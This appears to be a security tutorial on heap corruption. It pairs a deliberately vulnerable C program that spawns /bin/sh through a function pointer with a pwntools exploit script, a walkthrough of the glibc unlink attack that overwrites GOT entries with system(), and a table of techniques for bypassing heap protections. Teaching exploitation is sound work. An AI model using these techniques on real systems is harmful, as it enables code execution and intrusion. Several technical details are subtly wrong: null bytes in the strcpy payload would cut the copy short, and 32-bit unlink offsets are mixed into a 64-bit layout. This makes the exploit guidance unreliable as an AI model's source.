# Heap Corruption

## Overview

**Heap corruption** exploits vulnerabilities in dynamic memory allocation to manipulate heap metadata structures. By overflowing heap buffers, attackers can corrupt chunk headers, freelist pointers, or adjacent chunks, leading to arbitrary write primitives and code execution.

---

## Vulnerable C Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    char description[32];
    int priority;
    void (*callback)(void);
} Task;

void normal_callback() {
    printf("[*] Task completed normally\n");
}

void admin_callback() {
    printf("[!] ADMIN ACCESS GRANTED\n");
    system("/bin/sh");
}

int main() {
    Task *task1, *task2;
    char input[64];
    
    // Allocate two adjacent chunks
    task1 = (Task *)malloc(sizeof(Task));
    task2 = (Task *)malloc(sizeof(Task));
    
    // Initialize task1
    strcpy(task1->description, "Regular task");
    task1->priority = 1;
    task1->callback = normal_callback;
    
    // Initialize task2
    strcpy(task2->description, "Admin task");
    task2->priority = 10;
    task2->callback = admin_callback;
    
    printf("Task 1: %s (Priority: %d)\n", task1->description, task1->priority);
    printf("Task 2: %s (Priority: %d)\n", task2->description, task2->priority);
    
    // VULNERABILITY: Unbounded copy into task1->description
    printf("Update task 1 description: ");
    fgets(input, sizeof(input), stdin);
    input[strcspn(input, "\n")] = 0;
    
    strcpy(task1->description, input);  // HEAP OVERFLOW!
    
    // Execute callbacks
    printf("\n[*] Executing task 1...\n");
    task1->callback();
    
    printf("[*] Executing task 2...\n");
    task2->callback();  // May execute corrupted function pointer!
    
    free(task1);
    free(task2);
    return 0;
}
```

### Compilation
```bash
gcc -o heap_overflow heap_overflow.c -no-pie -fno-stack-protector
```

---

## Memory Layout (Adjacent Chunks)

### Normal State

```
Heap Memory
┌─────────────────────────────────────┐
│  Chunk 1 Header (16 bytes)          │
│  ┌─────────────────────────────┐    │
│  │ prev_size: 0x0              │    │
│  │ size: 0x31 (48 bytes)       │    │
│  └─────────────────────────────┘    │
├─────────────────────────────────────┤ ← task1
│  description[32]: "Regular task"    │  Offset 0-31
│  priority: 0x00000001               │  Offset 32-35
│  callback: 0x555555555189           │  Offset 36-43 (normal_callback)
├─────────────────────────────────────┤
│  Chunk 2 Header (16 bytes)          │
│  ┌─────────────────────────────┐    │
│  │ prev_size: 0x0              │    │
│  │ size: 0x31 (48 bytes)       │    │
│  └─────────────────────────────┘    │
├─────────────────────────────────────┤ ← task2
│  description[32]: "Admin task"      │
│  priority: 0x0000000A               │
│  callback: 0x5555555551C0           │  (admin_callback)
└─────────────────────────────────────┘
```

### After Heap Overflow

**Input:** `"A" * 32 + p32(999) + p64(admin_callback_addr)`

```
Heap Memory
┌─────────────────────────────────────┐
│  Chunk 1 Header (16 bytes)          │
│  ┌─────────────────────────────┐    │
│  │ prev_size: 0x0              │    │
│  │ size: 0x31                  │    │
│  └─────────────────────────────┘    │
├─────────────────────────────────────┤ ← task1
│  description[32]: "AAAA...AAAA"     │  Overflowed with 'A'
│  priority: 0x000003E7 (999)         │  CORRUPTED!
│  callback: 0x5555555551C0           │  CORRUPTED! (admin_callback)
├─────────────────────────────────────┤
│  Chunk 2 Header (16 bytes)          │
│  ┌─────────────────────────────┐    │
│  │ prev_size: 0x0              │    │  May be corrupted if overflow continues
│  │ size: 0x31                  │    │
│  └─────────────────────────────┘    │
├─────────────────────────────────────┤ ← task2
│  description[32]: "Admin task"      │
│  priority: 0x0000000A               │
│  callback: 0x5555555551C0           │
└─────────────────────────────────────┘

Result: task1->callback() now executes admin_callback → Shell!
```

---

## Heap Metadata Corruption (Unlink Attack)

### Chunk Structure (glibc)

```c
struct malloc_chunk {
    size_t prev_size;  // Size of previous chunk (if free)
    size_t size;       // Size of this chunk (3 LSB are flags)
    
    // Only for free chunks:
    struct malloc_chunk *fd;  // Forward pointer (next in freelist)
    struct malloc_chunk *bk;  // Backward pointer (prev in freelist)
};
```

### Unlink Macro (Simplified)

```c
#define unlink(P, BK, FD) {
    FD = P->fd;
    BK = P->bk;
    FD->bk = BK;  // Arbitrary write: *(FD + 12) = BK
    BK->fd = FD;  // Arbitrary write: *(BK + 8) = FD
}
```

### Exploitation Strategy

```
1. Overflow chunk to corrupt next chunk's metadata
2. Set fake fd/bk pointers:
   - fd = target_address - 12
   - bk = shellcode_address
3. Trigger free() on corrupted chunk
4. Unlink writes shellcode_address to target_address
```

### Memory Diagram (Unlink Attack)

```
Before free():
┌─────────────────────────────────────┐
│  Chunk A (allocated)                │
│  [User data with overflow]          │
├─────────────────────────────────────┤
│  Chunk B (fake free chunk)          │
│  ┌─────────────────────────────┐    │
│  │ prev_size: 0x0              │    │
│  │ size: 0x81 (PREV_INUSE=0)  │    │  Flag indicates prev chunk is free
│  │ fd: GOT_entry - 12          │    │  Target: __free_hook or GOT
│  │ bk: system_addr             │    │  What to write
│  └─────────────────────────────┘    │
└─────────────────────────────────────┘

After free(Chunk B):
Unlink executes:
  FD = GOT_entry - 12
  BK = system_addr
  *(GOT_entry - 12 + 12) = system_addr  // GOT entry now points to system()
  *(system_addr + 8) = GOT_entry - 12

Next call to free() → system("/bin/sh")
```

---

## Exploitation Example

```python
#!/usr/bin/env python3
from pwn import *

binary = ELF('./heap_overflow')
p = process(binary.path)

# Find addresses
admin_callback = binary.symbols['admin_callback']
log.info(f"admin_callback @ {hex(admin_callback)}")

# Payload: Overflow task1 to corrupt task1->callback
payload = b"A" * 32  # Fill description
payload += p32(999)  # Overwrite priority (not critical)
payload += p64(admin_callback)  # Overwrite callback pointer

p.sendlineafter(b"Update task 1 description: ", payload)
p.interactive()
```

---

## Modern Heap Protections

| Protection | Mechanism | Bypass |
|-----------|-----------|--------|
| **Tcache Double-Free Check** | Detects same chunk freed twice | Allocate between frees |
| **Safe Unlinking** | Validates fd/bk pointers | House of Spirit, Fastbin dup |
| **Top Chunk Integrity** | Checks top chunk size | Heap grooming |
| **Heap Canaries** | Random values in metadata | Leak canary via overflow |

---

## Key Takeaways

1. **Root Cause:** Buffer overflow in heap-allocated memory
2. **Impact:** Arbitrary write via metadata corruption
3. **Detection:** Heap profiling, ASAN, valgrind
4. **Exploitation:** Unlink attacks, fastbin dup, tcache poisoning
5. **Defense:** Heap hardening, size validation, ASAN

---

## Further Reading

- [how2heap](https://github.com/shellphish/how2heap) - Heap exploitation techniques
- [Malloc Maleficarum](https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt)
